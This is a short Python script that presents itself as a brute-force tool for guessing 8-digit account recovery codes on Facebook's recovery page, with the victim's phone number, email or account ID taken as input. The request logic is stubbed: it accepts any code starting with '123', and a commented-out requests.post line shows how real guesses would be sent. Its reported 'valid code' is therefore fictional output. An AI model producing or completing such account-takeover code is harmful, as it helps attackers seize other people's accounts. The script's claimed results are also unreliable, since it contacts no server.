import random

MAX_ATTEMPTS = 10000  # Adjust the maximum number of attempts as needed

def generate_code():
    digits = "0123456789"
    return ''.join(random.choice(digits) for _ in range(8))

def brute_force_code(target_info, target_url):
    for _ in range(MAX_ATTEMPTS):
        code = generate_code()
        if check_code_validity(target_info, code, target_url):
            return code
    raise ValueError("No valid code found.")

def check_code_validity(target_info, code, target_url):
    # Implement the actual code validation logic based on the provided target_info, code, and target_url
    # For demonstration purposes, assume any code starting with "123" is valid for now
    if code.startswith("123"):
        # Simulate making a request to the specified URL
        print(f"Checking code {code} on {target_url}")
        # In a real scenario, you would use a library like requests to make an HTTP request
        # Example: response = requests.post(target_url, data={'code': code, 'target_info': target_info})
        return True
    else:
        return False

# Example usage:
target_info = input("Enter the target's phone number, email, or account ID: ")
target_url = "https://www.facebook.com/recover/initiate/"
try:
    valid_code = brute_force_code(target_info, target_url)
    print(f"The valid 8-digit code on the specified page is: {valid_code}")
except ValueError as e:
    print(f"Error: {e}")
